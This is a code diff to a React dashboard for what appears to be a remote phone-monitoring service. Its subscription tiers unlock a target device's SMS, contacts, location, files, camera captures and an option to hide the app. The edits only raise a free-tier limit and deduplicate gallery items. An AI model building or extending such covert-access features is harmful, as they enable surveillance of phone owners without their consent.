@@ -63,7 +63,7 @@ const getPlanLimits = (plan: string): PlanLimits => {
     if (p === 'enterprise') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: -1, fileManager: true };
     if (p === 'premium') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: 10, fileManager: true };
     if (p === 'standard') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: false, hideApp: false, bulkDownload: true, maxDevices: 5, fileManager: false };
-    return { photos: 50, videos: 0, sms: false, contacts: false, torch: false, vibration: false, location: false, hideApp: false, bulkDownload: false, maxDevices: 1, fileManager: false };
+    return { photos: 100, videos: 0, sms: false, contacts: false, torch: false, vibration: false, location: false, hideApp: false, bulkDownload: false, maxDevices: 1, fileManager: false };
 };
 
 interface HomeProps {
@@ -1537,6 +1537,7 @@ export default function Home(props: any) {
             });
 
             socket.on("gallery_error", (data: any) => {
+                setIsFetchingFolders(false);
                 const errorMessage = data?.message || data?.error || "Gallery error occurred";
                 const lower = String(errorMessage).toLowerCase();
                 const isPermError = lower.includes("permission") || lower.includes("denied") || lower.includes("security");
@@ -1955,11 +1956,25 @@ export default function Home(props: any) {
                         const hasMore = data.hasMore !== undefined ? data.hasMore : false;
                         const serverTotal = data.total ?? data.totalCount ?? data.count ?? data.totalItems;
 
-                        // Filter out camera captures from the gallery feed and ensure device match
-                        const galleryItems = items.filter((item: any) => 
+                        // Filter out camera captures from the gallery feed, ensure device match, and deduplicate
+                        const rawGalleryItems = items.filter((item: any) => 
                             !(item.id && (item.id.includes('capture_') || item.id.includes('video_'))) &&
                             (!item.deviceId || item.deviceId === targetDeviceId)
                         );
+
+                        // Strict deduplication by ID, URL, and cleaned filename
+                        const seenKeys = new Set<string>();
+                        const galleryItems: any[] = [];
+                        for (const item of rawGalleryItems) {
+                            const k = item.id || item.url || '';
+                            const rawName = String(item.name || item.id || '');
+                            const cleanName = rawName.split('/').pop()?.replace(/^[0-9]+_/, '') || rawName;
+                            const dedupeKey = cleanName ? `${item.deviceId || targetDeviceId || ''}_${cleanName}` : k;
+                            if (seenKeys.has(k) || (cleanName && seenKeys.has(dedupeKey))) continue;
+                            seenKeys.add(k);
+                            if (cleanName) seenKeys.add(dedupeKey);
+                            galleryItems.push(item);
+                        }
 
                         if (serverTotal !== undefined && serverTotal !== null && serverTotal > 0) {
                             setTotalMediaCount(serverTotal);
@@ -1969,9 +1984,15 @@ export default function Home(props: any) {
 
                         if (append) {
                             setImages(prev => {
-                                const existingKeys = new Set(prev.map((i: any) => i.id || i.url));
+                                const existingKeys = new Set(prev.map((i: any) => {
+                                    const rawName = String(i.name || i.id || '');
+                                    const cleanName = rawName.split('/').pop()?.replace(/^[0-9]+_/, '') || rawName;
+                                    return cleanName ? `${i.deviceId || targetDeviceId || ''}_${cleanName}` : (i.id || i.url);
+                                }));
                                 const newItems = galleryItems.filter((i: any) => {
-                                    const k = i.id || i.url;
+                                    const rawName = String(i.name || i.id || '');
+                                    const cleanName = rawName.split('/').pop()?.replace(/^[0-9]+_/, '') || rawName;
+                                    const k = cleanName ? `${i.deviceId || targetDeviceId || ''}_${cleanName}` : (i.id || i.url);
                                     return k && !existingKeys.has(k);
                                 });
                                 return [...prev, ...newItems];
@@ -1981,12 +2002,16 @@ export default function Home(props: any) {
                             setImages(prev => {
                                 const incomingMap = new Map<string, any>();
                                 galleryItems.forEach((item: any) => {
-                                    const k = item.id || item.url;
+                                    const rawName = String(item.name || item.id || '');
+                                    const cleanName = rawName.split('/').pop()?.replace(/^[0-9]+_/, '') || rawName;
+                                    const k = cleanName ? `${item.deviceId || targetDeviceId || ''}_${cleanName}` : (item.id || item.url);
                                     if (k) incomingMap.set(k, item);
                                 });
                                 const merged = [...galleryItems];
                                 prev.forEach((pItem: any) => {
-                                    const k = pItem.id || pItem.url;
+                                    const rawName = String(pItem.name || pItem.id || '');
+                                    const cleanName = rawName.split('/').pop()?.replace(/^[0-9]+_/, '') || rawName;
+                                    const k = cleanName ? `${pItem.deviceId || targetDeviceId || ''}_${cleanName}` : (pItem.id || pItem.url);
                                     if (k && !incomingMap.has(k) && (!pItem.deviceId || pItem.deviceId === targetDeviceId)) {
                                         merged.push(pItem);
                                     }
